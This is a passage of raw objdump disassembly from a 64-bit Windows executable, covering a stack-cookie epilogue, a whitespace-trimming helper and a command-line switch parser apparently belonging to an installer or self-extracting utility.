   140006d98:	48 ff 15 d9 26 00 00 	rex.W call *0x26d9(%rip)        # 0x140009478
   140006d9f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006da4:	8b f0                	mov    %eax,%esi
   140006da6:	85 c0                	test   %eax,%eax
   140006da8:	0f 84 b5 01 00 00    	je     0x140006f63
   140006dae:	44 89 6c 24 38       	mov    %r13d,0x38(%rsp)
   140006db3:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140006db8:	4c 89 6c 24 30       	mov    %r13,0x30(%rsp)
   140006dbd:	45 33 c9             	xor    %r9d,%r9d
   140006dc0:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140006dc5:	45 33 c0             	xor    %r8d,%r8d
   140006dc8:	48 8d 44 24 54       	lea    0x54(%rsp),%rax
   140006dcd:	33 d2                	xor    %edx,%edx
   140006dcf:	33 c9                	xor    %ecx,%ecx
   140006dd1:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006dd6:	48 ff 15 1b 25 00 00 	rex.W call *0x251b(%rip)        # 0x1400092f8
   140006ddd:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006de2:	85 c0                	test   %eax,%eax
   140006de4:	75 5f                	jne    0x140006e45
   140006de6:	bb 00 02 00 00       	mov    $0x200,%ebx
   140006deb:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   140006def:	44 8b c3             	mov    %ebx,%r8d
   140006df2:	33 d2                	xor    %edx,%edx
   140006df4:	e8 10 1d 00 00       	call   0x140008b09
   140006df9:	e8 02 09 00 00       	call   0x140007700
   140006dfe:	89 05 40 67 00 00    	mov    %eax,0x6740(%rip)        # 0x14000d544
   140006e04:	48 ff 15 f5 23 00 00 	rex.W call *0x23f5(%rip)        # 0x140009200
   140006e0b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006e10:	4c 89 6c 24 30       	mov    %r13,0x30(%rsp)
   140006e15:	45 33 c9             	xor    %r9d,%r9d
   140006e18:	44 8b c0             	mov    %eax,%r8d
   140006e1b:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140006e1f:	48 8d 45 70          	lea    0x70(%rbp),%rax
   140006e23:	33 d2                	xor    %edx,%edx
   140006e25:	b9 00 10 00 00       	mov    $0x1000,%ecx
   140006e2a:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006e2f:	48 ff 15 62 25 00 00 	rex.W call *0x2562(%rip)        # 0x140009398
   140006e36:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006e3b:	ba f9 04 00 00       	mov    $0x4f9,%edx
   140006e40:	e9 78 01 00 00       	jmp    0x140006fbd
   140006e45:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140006e4a:	48 ff 15 cf 24 00 00 	rex.W call *0x24cf(%rip)        # 0x140009320
   140006e51:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006e56:	ba 06 00 00 00       	mov    $0x6,%edx
   140006e5b:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   140006e60:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140006e65:	48 2b f8             	sub    %rax,%rdi
   140006e68:	44 8d 4a fb          	lea    -0x5(%rdx),%r9d
   140006e6c:	48 8d 42 fc          	lea    -0x4(%rdx),%rax
   140006e70:	48 85 c0             	test   %rax,%rax
   140006e73:	74 11                	je     0x140006e86
   140006e75:	8a 04 0f             	mov    (%rdi,%rcx,1),%al
   140006e78:	84 c0                	test   %al,%al
   140006e7a:	74 0a                	je     0x140006e86
   140006e7c:	88 01                	mov    %al,(%rcx)
   140006e7e:	49 03 c9             	add    %r9,%rcx
   140006e81:	49 2b d1             	sub    %r9,%rdx
   140006e84:	75 e6                	jne    0x140006e6c
   140006e86:	48 85 d2             	test   %rdx,%rdx
   140006e89:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140006e8d:	bb 00 02 00 00       	mov    $0x200,%ebx
   140006e92:	48 0f 45 c1          	cmovne %rcx,%rax
   140006e96:	44 88 28             	mov    %r13b,(%rax)
   140006e99:	41 0f b7 c5          	movzwl %r13w,%eax
   140006e9d:	44 3b f3             	cmp    %ebx,%r14d
   140006ea0:	74 0c                	je     0x140006eae
   140006ea2:	03 db                	add    %ebx,%ebx
   140006ea4:	66 41 03 c1          	add    %r9w,%ax
   140006ea8:	66 83 f8 08          	cmp    $0x8,%ax
   140006eac:	72 ef                	jb     0x140006e9d
   140006eae:	66 83 f8 08          	cmp    $0x8,%ax
   140006eb2:	75 24                	jne    0x140006ed8
   140006eb4:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   140006eb9:	45 33 c9             	xor    %r9d,%r9d
   140006ebc:	45 33 c0             	xor    %r8d,%r8d
   140006ebf:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140006ec6:	00 
   140006ec7:	ba c5 04 00 00       	mov    $0x4c5,%edx
   140006ecc:	33 c9                	xor    %ecx,%ecx
   140006ece:	e8 f9 de ff ff       	call   0x140004dcc
   140006ed3:	e9 11 01 00 00       	jmp    0x140006fe9
   140006ed8:	f6 05 85 6f 00 00 08 	testb  $0x8,0x6f85(%rip)        # 0x14000de64
   140006edf:	74 2d                	je     0x140006f0e
   140006ee1:	f7 44 24 50 00 80 00 	testl  $0x8000,0x50(%rsp)
   140006ee8:	00 
   140006ee9:	74 23                	je     0x140006f0e
   140006eeb:	44 8b 05 76 6f 00 00 	mov    0x6f76(%rip),%r8d        # 0x14000de68
   140006ef2:	48 8d 0d c7 5d 00 00 	lea    0x5dc7(%rip),%rcx        # 0x14000ccc0
   140006ef9:	0f b7 c0             	movzwl %ax,%eax
   140006efc:	41 c1 e8 02          	shr    $0x2,%r8d
   140006f00:	8b 14 81             	mov    (%rcx,%rax,4),%edx
   140006f03:	03 d2                	add    %edx,%edx
   140006f05:	44 03 05 5c 6f 00 00 	add    0x6f5c(%rip),%r8d        # 0x14000de68
   140006f0c:	eb 14                	jmp    0x140006f22
   140006f0e:	44 8b 05 53 6f 00 00 	mov    0x6f53(%rip),%r8d        # 0x14000de68
   140006f15:	48 8d 0d a4 5d 00 00 	lea    0x5da4(%rip),%rcx        # 0x14000ccc0
   140006f1c:	0f b7 c0             	movzwl %ax,%eax
   140006f1f:	8b 14 81             	mov    (%rcx,%rax,4),%edx
   140006f22:	41 8b c4             	mov    %r12d,%eax
   140006f25:	83 e0 03             	and    $0x3,%eax
   140006f28:	3c 03                	cmp    $0x3,%al
   140006f2a:	75 1a                	jne    0x140006f46
   140006f2c:	41 8d 04 10          	lea    (%r8,%rdx,1),%eax
   140006f30:	3b c6                	cmp    %esi,%eax
   140006f32:	76 20                	jbe    0x140006f54
   140006f34:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   140006f39:	41 8b cf             	mov    %r15d,%ecx
   140006f3c:	e8 b7 b5 ff ff       	call   0x1400024f8
   140006f41:	e9 a5 00 00 00       	jmp    0x140006feb
   140006f46:	45 84 e1             	test   %r12b,%r9b
   140006f49:	74 04                	je     0x140006f4f
   140006f4b:	3b d6                	cmp    %esi,%edx
   140006f4d:	eb e3                	jmp    0x140006f32
   140006f4f:	44 3b c6             	cmp    %esi,%r8d
   140006f52:	eb de                	jmp    0x140006f32
   140006f54:	44 89 2d e9 65 00 00 	mov    %r13d,0x65e9(%rip)        # 0x14000d544
   140006f5b:	41 8b c1             	mov    %r9d,%eax
   140006f5e:	e9 88 00 00 00       	jmp    0x140006feb
   140006f63:	bb 00 02 00 00       	mov    $0x200,%ebx
   140006f68:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   140006f6c:	44 8b c3             	mov    %ebx,%r8d
   140006f6f:	33 d2                	xor    %edx,%edx
   140006f71:	e8 93 1b 00 00       	call   0x140008b09
   140006f76:	e8 85 07 00 00       	call   0x140007700
   140006f7b:	89 05 c3 65 00 00    	mov    %eax,0x65c3(%rip)        # 0x14000d544
   140006f81:	48 ff 15 78 22 00 00 	rex.W call *0x2278(%rip)        # 0x140009200
   140006f88:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006f8d:	4c 89 6c 24 30       	mov    %r13,0x30(%rsp)
   140006f92:	45 33 c9             	xor    %r9d,%r9d
   140006f95:	44 8b c0             	mov    %eax,%r8d
   140006f98:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140006f9c:	48 8d 45 70          	lea    0x70(%rbp),%rax
   140006fa0:	33 d2                	xor    %edx,%edx
   140006fa2:	b9 00 10 00 00       	mov    $0x1000,%ecx
   140006fa7:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006fac:	48 ff 15 e5 23 00 00 	rex.W call *0x23e5(%rip)        # 0x140009398
   140006fb3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006fb8:	ba b0 04 00 00       	mov    $0x4b0,%edx
   140006fbd:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   140006fc2:	4c 8d 4d 70          	lea    0x70(%rbp),%r9
   140006fc6:	4c 8b c7             	mov    %rdi,%r8
   140006fc9:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140006fd0:	00 
   140006fd1:	33 c9                	xor    %ecx,%ecx
   140006fd3:	e8 f4 dd ff ff       	call   0x140004dcc
   140006fd8:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140006fdd:	48 ff 15 3c 23 00 00 	rex.W call *0x233c(%rip)        # 0x140009320
   140006fe4:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006fe9:	33 c0                	xor    %eax,%eax
   140006feb:	48 8b 8d 70 02 00 00 	mov    0x270(%rbp),%rcx
   140006ff2:	48 33 cc             	xor    %rsp,%rcx
   140006ff5:	e8 76 14 00 00       	call   0x140008470
   140006ffa:	4c 8d 9c 24 80 03 00 	lea    0x380(%rsp),%r11
   140007001:	00 
   140007002:	49 8b 5b 38          	mov    0x38(%r11),%rbx
   140007006:	49 8b 73 40          	mov    0x40(%r11),%rsi
   14000700a:	49 8b 7b 48          	mov    0x48(%r11),%rdi
   14000700e:	49 8b e3             	mov    %r11,%rsp
   140007011:	41 5f                	pop    %r15
   140007013:	41 5e                	pop    %r14
   140007015:	41 5d                	pop    %r13
   140007017:	41 5c                	pop    %r12
   140007019:	5d                   	pop    %rbp
   14000701a:	c3                   	ret
   14000701b:	cc                   	int3
   14000701c:	cc                   	int3
   14000701d:	cc                   	int3
   14000701e:	cc                   	int3
   14000701f:	cc                   	int3
   140007020:	cc                   	int3
   140007021:	cc                   	int3
   140007022:	cc                   	int3
   140007023:	cc                   	int3
   140007024:	8a 01                	mov    (%rcx),%al
   140007026:	45 33 c0             	xor    %r8d,%r8d
   140007029:	4c 8b da             	mov    %rdx,%r11
   14000702c:	4c 8b d1             	mov    %rcx,%r10
   14000702f:	84 c0                	test   %al,%al
   140007031:	74 1a                	je     0x14000704d
   140007033:	4c 8b c9             	mov    %rcx,%r9
   140007036:	3c 20                	cmp    $0x20,%al
   140007038:	74 06                	je     0x140007040
   14000703a:	2c 09                	sub    $0x9,%al
   14000703c:	3c 04                	cmp    $0x4,%al
   14000703e:	77 0d                	ja     0x14000704d
   140007040:	49 ff c1             	inc    %r9
   140007043:	41 ff c0             	inc    %r8d
   140007046:	41 8a 01             	mov    (%r9),%al
   140007049:	84 c0                	test   %al,%al
   14000704b:	75 e9                	jne    0x140007036
   14000704d:	4d 63 c8             	movslq %r8d,%r9
   140007050:	4d 03 ca             	add    %r10,%r9
   140007053:	41 80 39 00          	cmpb   $0x0,(%r9)
   140007057:	75 04                	jne    0x14000705d
   140007059:	33 c0                	xor    %eax,%eax
   14000705b:	c3                   	ret
   14000705c:	cc                   	int3
   14000705d:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   140007061:	48 ff c1             	inc    %rcx
   140007064:	41 80 3c 09 00       	cmpb   $0x0,(%r9,%rcx,1)
   140007069:	75 f6                	jne    0x140007061
   14000706b:	83 e9 01             	sub    $0x1,%ecx
   14000706e:	48 63 d1             	movslq %ecx,%rdx
   140007071:	78 16                	js     0x140007089
   140007073:	41 8a 04 11          	mov    (%r9,%rdx,1),%al
   140007077:	3c 20                	cmp    $0x20,%al
   140007079:	74 06                	je     0x140007081
   14000707b:	2c 09                	sub    $0x9,%al
   14000707d:	3c 04                	cmp    $0x4,%al
   14000707f:	77 08                	ja     0x140007089
   140007081:	ff c9                	dec    %ecx
   140007083:	48 83 ea 01          	sub    $0x1,%rdx
   140007087:	79 ea                	jns    0x140007073
   140007089:	41 03 c8             	add    %r8d,%ecx
   14000708c:	45 89 03             	mov    %r8d,(%r11)
   14000708f:	48 63 d1             	movslq %ecx,%rdx
   140007092:	b8 01 00 00 00       	mov    $0x1,%eax
   140007097:	42 c6 44 12 01 00    	movb   $0x0,0x1(%rdx,%r10,1)
   14000709d:	c3                   	ret
   14000709e:	cc                   	int3
   14000709f:	cc                   	int3
   1400070a0:	cc                   	int3
   1400070a1:	cc                   	int3
   1400070a2:	cc                   	int3
   1400070a3:	cc                   	int3
   1400070a4:	cc                   	int3
   1400070a5:	cc                   	int3
   1400070a6:	cc                   	int3
   1400070a7:	cc                   	int3
   1400070a8:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400070ad:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400070b2:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400070b7:	55                   	push   %rbp
   1400070b8:	41 54                	push   %r12
   1400070ba:	41 55                	push   %r13
   1400070bc:	41 56                	push   %r14
   1400070be:	41 57                	push   %r15
   1400070c0:	48 8d 6c 24 a0       	lea    -0x60(%rsp),%rbp
   1400070c5:	48 81 ec 60 01 00 00 	sub    $0x160,%rsp
   1400070cc:	48 8b 05 35 4f 00 00 	mov    0x4f35(%rip),%rax        # 0x14000c008
   1400070d3:	48 33 c4             	xor    %rsp,%rax
   1400070d6:	48 89 45 50          	mov    %rax,0x50(%rbp)
   1400070da:	45 33 ff             	xor    %r15d,%r15d
   1400070dd:	41 bc 01 00 00 00    	mov    $0x1,%r12d
   1400070e3:	4c 8b f1             	mov    %rcx,%r14
   1400070e6:	41 8b f4             	mov    %r12d,%esi
   1400070e9:	48 85 c9             	test   %rcx,%rcx
   1400070ec:	0f 84 ce 05 00 00    	je     0x1400076c0
   1400070f2:	44 38 39             	cmp    %r15b,(%rcx)
   1400070f5:	0f 84 c5 05 00 00    	je     0x1400076c0
   1400070fb:	41 8d 7c 24 01       	lea    0x1(%r12),%edi
   140007100:	41 bd 04 01 00 00    	mov    $0x104,%r13d
   140007106:	85 f6                	test   %esi,%esi
   140007108:	0f 84 bf 00 00 00    	je     0x1400071cd
   14000710e:	41 80 3e 20          	cmpb   $0x20,(%r14)
   140007112:	74 09                	je     0x14000711d
   140007114:	41 8a 06             	mov    (%r14),%al
   140007117:	2c 09                	sub    $0x9,%al
   140007119:	3c 04                	cmp    $0x4,%al
   14000711b:	77 14                	ja     0x140007131
   14000711d:	49 8b ce             	mov    %r14,%rcx
   140007120:	48 ff 15 01 24 00 00 	rex.W call *0x2401(%rip)        # 0x140009528
   140007127:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000712c:	4c 8b f0             	mov    %rax,%r14
   14000712f:	eb dd                	jmp    0x14000710e
   140007131:	45 38 3e             	cmp    %r15b,(%r14)
   140007134:	0f 84 93 00 00 00    	je     0x1400071cd
   14000713a:	49 8b cf             	mov    %r15,%rcx
   14000713d:	45 8b c7             	mov    %r15d,%r8d
   140007140:	45 8b cf             	mov    %r15d,%r9d
   140007143:	41 8b d4             	mov    %r12d,%edx
   140007146:	45 85 c0             	test   %r8d,%r8d
   140007149:	75 0f                	jne    0x14000715a
   14000714b:	41 8a 06             	mov    (%r14),%al
   14000714e:	3c 20                	cmp    $0x20,%al
   140007150:	74 60                	je     0x1400071b2
   140007152:	2c 09                	sub    $0x9,%al
   140007154:	3c 04                	cmp    $0x4,%al
   140007156:	76 5a                	jbe    0x1400071b2
   140007158:	eb 05                	jmp    0x14000715f
   14000715a:	45 85 c9             	test   %r9d,%r9d
   14000715d:	75 53                	jne    0x1400071b2
   14000715f:	41 8a 06             	mov    (%r14),%al
   140007162:	3c 22                	cmp    $0x22,%al
   140007164:	75 2e                	jne    0x140007194
   140007166:	41 38 46 01          	cmp    %al,0x1(%r14)
   14000716a:	74 0f                	je     0x14000717b
   14000716c:	45 85 c0             	test   %r8d,%r8d
   14000716f:	75 05                	jne    0x140007176
   140007171:	45 8b c4             	mov    %r12d,%r8d
   140007174:	eb 31                	jmp    0x1400071a7
   140007176:	45 8b cc             	mov    %r12d,%r9d
   140007179:	eb 2c                	jmp    0x1400071a7
   14000717b:	41 3b d5             	cmp    %r13d,%edx
   14000717e:	0f 83 e2 03 00 00    	jae    0x140007566
   140007184:	41 03 d4             	add    %r12d,%edx
   140007187:	c6 44 0c 40 22       	movb   $0x22,0x40(%rsp,%rcx,1)
   14000718c:	49 03 cc             	add    %r12,%rcx
   14000718f:	48 8b c7             	mov    %rdi,%rax
   140007192:	eb 16                	jmp    0x1400071aa
   140007194:	41 3b d5             	cmp    %r13d,%edx
   140007197:	0f 83 c9 03 00 00    	jae    0x140007566
   14000719d:	41 03 d4             	add    %r12d,%edx
   1400071a0:	88 44 0c 40          	mov    %al,0x40(%rsp,%rcx,1)
   1400071a4:	49 03 cc             	add    %r12,%rcx
   1400071a7:	49 8b c4             	mov    %r12,%rax
   1400071aa:	4c 03 f0             	add    %rax,%r14
   1400071ad:	45 38 3e             	cmp    %r15b,(%r14)
   1400071b0:	75 94                	jne    0x140007146
   1400071b2:	49 3b cd             	cmp    %r13,%rcx
   1400071b5:	0f 83 36 05 00 00    	jae    0x1400076f1
   1400071bb:	44 88 7c 0c 40       	mov    %r15b,0x40(%rsp,%rcx,1)
   1400071c0:	45 85 c0             	test   %r8d,%r8d
   1400071c3:	74 60                	je     0x140007225
   1400071c5:	45 85 c9             	test   %r9d,%r9d
   1400071c8:	75 60                	jne    0x14000722a
   1400071ca:	41 8b f7             	mov    %r15d,%esi
   1400071cd:	44 39 3d 38 5b 00 00 	cmp    %r15d,0x5b38(%rip)        # 0x14000cd0c
   1400071d4:	0f 84 e2 04 00 00    	je     0x1400076bc
   1400071da:	44 38 3d 3d 5c 00 00 	cmp    %r15b,0x5c3d(%rip)        # 0x14000ce1e
   1400071e1:	0f 85 d5 04 00 00    	jne    0x1400076bc
   1400071e7:	48 8b 0d 82 6c 00 00 	mov    0x6c82(%rip),%rcx        # 0x14000de70
   1400071ee:	48 8d 1d 29 5c 00 00 	lea    0x5c29(%rip),%rbx        # 0x14000ce1e
   1400071f5:	48 8b d3             	mov    %rbx,%rdx
   1400071f8:	45 8b c5             	mov    %r13d,%r8d
   1400071fb:	48 ff 15 ee 21 00 00 	rex.W call *0x21ee(%rip)        # 0x1400093f0
   140007202:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007207:	85 c0                	test   %eax,%eax
   140007209:	0f 84 aa 04 00 00    	je     0x1400076b9
   14000720f:	ba 5c 00 00 00       	mov    $0x5c,%edx
   140007214:	48 8b cb             	mov    %rbx,%rcx
   140007217:	e8 4c 0b 00 00       	call   0x140007d68
   14000721c:	44 88 78 01          	mov    %r15b,0x1(%rax)
   140007220:	e9 97 04 00 00       	jmp    0x1400076bc
   140007225:	45 85 c9             	test   %r9d,%r9d
   140007228:	75 a0                	jne    0x1400071ca
   14000722a:	8a 44 24 40          	mov    0x40(%rsp),%al
   14000722e:	2c 2d                	sub    $0x2d,%al
   140007230:	a8 fd                	test   $0xfd,%al
   140007232:	0f 85 2e 03 00 00    	jne    0x140007566
   140007238:	48 0f be 4c 24 41    	movsbq 0x41(%rsp),%rcx
   14000723e:	48 ff 15 1b 23 00 00 	rex.W call *0x231b(%rip)        # 0x140009560
   140007245:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000724a:	0f be c8             	movsbl %al,%ecx
   14000724d:	83 e9 3f             	sub    $0x3f,%ecx
   140007250:	0f 84 19 04 00 00    	je     0x14000766f
   140007256:	83 e9 04             	sub    $0x4,%ecx
   140007259:	0f 84 0e 03 00 00    	je     0x14000756d
   14000725f:	41 2b cc             	sub    %r12d,%ecx
   140007262:	0f 84 db 01 00 00    	je     0x140007443
   140007268:	83 e9 0a             	sub    $0xa,%ecx
   14000726b:	0f 84 5c 01 00 00    	je     0x1400073cd
   140007271:	83 e9 03             	sub    $0x3,%ecx
   140007274:	0f 84 07 01 00 00    	je     0x140007381
   14000727a:	41 2b cc             	sub    %r12d,%ecx
   14000727d:	74 19                	je     0x140007298
   14000727f:	3b cf                	cmp    %edi,%ecx
   140007281:	0f 84 bc 01 00 00    	je     0x140007443
   140007287:	41 8b f7             	mov    %r15d,%esi
   14000728a:	45 38 3e             	cmp    %r15b,(%r14)
   14000728d:	0f 84 3a ff ff ff    	je     0x1400071cd
   140007293:	e9 6e fe ff ff       	jmp    0x140007106
   140007298:	8a 44 24 42          	mov    0x42(%rsp),%al
   14000729c:	84 c0                	test   %al,%al
   14000729e:	75 13                	jne    0x1400072b3
   1400072a0:	c7 05 b2 6b 00 00 03 	movl   $0x3,0x6bb2(%rip)        # 0x14000de5c
   1400072a7:	00 00 00 
   1400072aa:	44 89 25 57 5a 00 00 	mov    %r12d,0x5a57(%rip)        # 0x14000cd08
   1400072b1:	eb d7                	jmp    0x14000728a
   1400072b3:	3c 3a                	cmp    $0x3a,%al
   1400072b5:	0f 85 8b 00 00 00    	jne    0x140007346
   1400072bb:	48 8b 44 24 43       	mov    0x43(%rsp),%rax
   1400072c0:	44 89 25 95 6b 00 00 	mov    %r12d,0x6b95(%rip)        # 0x14000de5c
   1400072c7:	84 c0                	test   %al,%al
   1400072c9:	74 bf                	je     0x14000728a
   1400072cb:	48 8d 5c 24 43       	lea    0x43(%rsp),%rbx
   1400072d0:	48 0f be c8          	movsbq %al,%rcx
   1400072d4:	48 ff 15 85 22 00 00 	rex.W call *0x2285(%rip)        # 0x140009560
   1400072db:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400072e0:	49 03 dc             	add    %r12,%rbx
   1400072e3:	3c 41                	cmp    $0x41,%al
   1400072e5:	74 47                	je     0x14000732e
   1400072e7:	3c 44                	cmp    $0x44,%al
   1400072e9:	74 3a                	je     0x140007325
   1400072eb:	3c 49                	cmp    $0x49,%al
   1400072ed:	74 2d                	je     0x14000731c
   1400072ef:	3c 4e                	cmp    $0x4e,%al
   1400072f1:	74 20                	je     0x140007313
   1400072f3:	3c 50                	cmp    $0x50,%al
   1400072f5:	74 12                	je     0x140007309
   1400072f7:	3c 53                	cmp    $0x53,%al
   1400072f9:	74 05                	je     0x140007300
   1400072fb:	41 8b f7             	mov    %r15d,%esi
   1400072fe:	eb 3b                	jmp    0x14000733b
   140007300:	83 0d 55 6b 00 00 04 	orl    $0x4,0x6b55(%rip)        # 0x14000de5c
   140007307:	eb 2b                	jmp    0x140007334
   140007309:	0f ba 2d 17 5d 00 00 	btsl   $0x7,0x5d17(%rip)        # 0x14000d028
   140007310:	07 
   140007311:	eb 28                	jmp    0x14000733b
   140007313:	83 25 42 6b 00 00 fe 	andl   $0xfffffffe,0x6b42(%rip)        # 0x14000de5c
   14000731a:	eb 18                	jmp    0x140007334
   14000731c:	83 25 39 6b 00 00 fd 	andl   $0xfffffffd,0x6b39(%rip)        # 0x14000de5c
   140007323:	eb 0f                	jmp    0x140007334
   140007325:	83 0d fc 5c 00 00 40 	orl    $0x40,0x5cfc(%rip)        # 0x14000d028
   14000732c:	eb 0d                	jmp    0x14000733b
   14000732e:	09 3d 28 6b 00 00    	or     %edi,0x6b28(%rip)        # 0x14000de5c
   140007334:	44 89 25 cd 59 00 00 	mov    %r12d,0x59cd(%rip)        # 0x14000cd08
   14000733b:	8a 03                	mov    (%rbx),%al
   14000733d:	84 c0                	test   %al,%al
   14000733f:	75 8f                	jne    0x1400072d0
   140007341:	e9 44 ff ff ff       	jmp    0x14000728a
   140007346:	83 4c 24 28 ff       	orl    $0xffffffff,0x28(%rsp)
   14000734b:	48 8d 44 24 41       	lea    0x41(%rsp),%rax
   140007350:	41 83 c9 ff          	or     $0xffffffff,%r9d
   140007354:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140007359:	4c 8d 05 60 26 00 00 	lea    0x2660(%rip),%r8        # 0x1400099c0
   140007360:	41 8b d4             	mov    %r12d,%edx
   140007363:	b9 7f 00 00 00       	mov    $0x7f,%ecx
   140007368:	48 ff 15 89 1e 00 00 	rex.W call *0x1e89(%rip)        # 0x1400091f8
   14000736f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007374:	3b c7                	cmp    %edi,%eax
   140007376:	0f 84 0e ff ff ff    	je     0x14000728a
   14000737c:	e9 06 ff ff ff       	jmp    0x140007287
   140007381:	8a 44 24 42          	mov    0x42(%rsp),%al
   140007385:	84 c0                	test   %al,%al
   140007387:	75 0c                	jne    0x140007395
   140007389:	66 89 3d 88 59 00 00 	mov    %di,0x5988(%rip)        # 0x14000cd18
   140007390:	e9 f5 fe ff ff       	jmp    0x14000728a
   140007395:	3c 3a                	cmp    $0x3a,%al
   140007397:	0f 85 ea fe ff ff    	jne    0x140007287
   14000739d:	48 0f be 4c 24 43    	movsbq 0x43(%rsp),%rcx
   1400073a3:	48 ff 15 b6 21 00 00 	rex.W call *0x21b6(%rip)        # 0x140009560
   1400073aa:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400073af:	3c 31                	cmp    $0x31,%al
   1400073b1:	74 d6                	je     0x140007389
   1400073b3:	3c 41                	cmp    $0x41,%al
   1400073b5:	74 09                	je     0x1400073c0
   1400073b7:	3c 55                	cmp    $0x55,%al
   1400073b9:	74 ce                	je     0x140007389
   1400073bb:	e9 c7 fe ff ff       	jmp    0x140007287
   1400073c0:	66 44 89 25 50 59 00 	mov    %r12w,0x5950(%rip)        # 0x14000cd18
   1400073c7:	00 
   1400073c8:	e9 bd fe ff ff       	jmp    0x14000728a
   1400073cd:	8a 44 24 42          	mov    0x42(%rsp),%al
   1400073d1:	84 c0                	test   %al,%al
   1400073d3:	75 0c                	jne    0x1400073e1
   1400073d5:	44 89 25 30 59 00 00 	mov    %r12d,0x5930(%rip)        # 0x14000cd0c
   1400073dc:	e9 a9 fe ff ff       	jmp    0x14000728a
   1400073e1:	3c 3a                	cmp    $0x3a,%al
   1400073e3:	0f 85 9e fe ff ff    	jne    0x140007287
   1400073e9:	48 8b 44 24 43       	mov    0x43(%rsp),%rax
   1400073ee:	84 c0                	test   %al,%al
   1400073f0:	0f 84 94 fe ff ff    	je     0x14000728a
   1400073f6:	48 8d 5c 24 43       	lea    0x43(%rsp),%rbx
   1400073fb:	48 0f be c8          	movsbq %al,%rcx
   1400073ff:	48 ff 15 5a 21 00 00 	rex.W call *0x215a(%rip)        # 0x140009560
   140007406:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000740b:	49 03 dc             	add    %r12,%rbx
   14000740e:	3c 45                	cmp    $0x45,%al
   140007410:	74 1f                	je     0x140007431
   140007412:	3c 47                	cmp    $0x47,%al
   140007414:	74 12                	je     0x140007428
   140007416:	3c 56                	cmp    $0x56,%al
   140007418:	74 05                	je     0x14000741f
   14000741a:	41 8b f7             	mov    %r15d,%esi
   14000741d:	eb 19                	jmp    0x140007438
   14000741f:	44 89 25 ee 58 00 00 	mov    %r12d,0x58ee(%rip)        # 0x14000cd14
   140007426:	eb 10                	jmp    0x140007438
   140007428:	44 89 25 e1 58 00 00 	mov    %r12d,0x58e1(%rip)        # 0x14000cd10
   14000742f:	eb 07                	jmp    0x140007438
   140007431:	44 89 25 d4 58 00 00 	mov    %r12d,0x58d4(%rip)        # 0x14000cd0c
   140007438:	8a 03                	mov    (%rbx),%al
   14000743a:	84 c0                	test   %al,%al
   14000743c:	75 bd                	jne    0x1400073fb
   14000743e:	e9 47 fe ff ff       	jmp    0x14000728a
   140007443:	80 7c 24 42 3a       	cmpb   $0x3a,0x42(%rsp)
   140007448:	0f 85 39 fe ff ff    	jne    0x140007287
   14000744e:	48 8b 44 24 43       	mov    0x43(%rsp),%rax
   140007453:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140007458:	2c 22                	sub    $0x22,%al
   14000745a:	f6 d8                	neg    %al
   14000745c:	1b db                	sbb    %ebx,%ebx
   14000745e:	83 c3 04             	add    $0x4,%ebx
   140007461:	8b c3                	mov    %ebx,%eax
   140007463:	48 03 c8             	add    %rax,%rcx
   140007466:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000746a:	48 ff c0             	inc    %rax
   14000746d:	44 38 3c 01          	cmp    %r15b,(%rcx,%rax,1)
   140007471:	75 f7                	jne    0x14000746a
   140007473:	48 85 c0             	test   %rax,%rax
   140007476:	0f 84 0b fe ff ff    	je     0x140007287
   14000747c:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140007481:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   140007485:	e8 9a fb ff ff       	call   0x140007024
   14000748a:	85 c0                	test   %eax,%eax
   14000748c:	0f 84 f5 fd ff ff    	je     0x140007287
   140007492:	48 0f be 4c 24 41    	movsbq 0x41(%rsp),%rcx
   140007498:	48 ff 15 c1 20 00 00 	rex.W call *0x20c1(%rip)        # 0x140009560
   14000749f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400074a4:	4d 8b c5             	mov    %r13,%r8
   1400074a7:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400074ac:	3c 54                	cmp    $0x54,%al
   1400074ae:	8b 44 24 30          	mov    0x30(%rsp),%eax
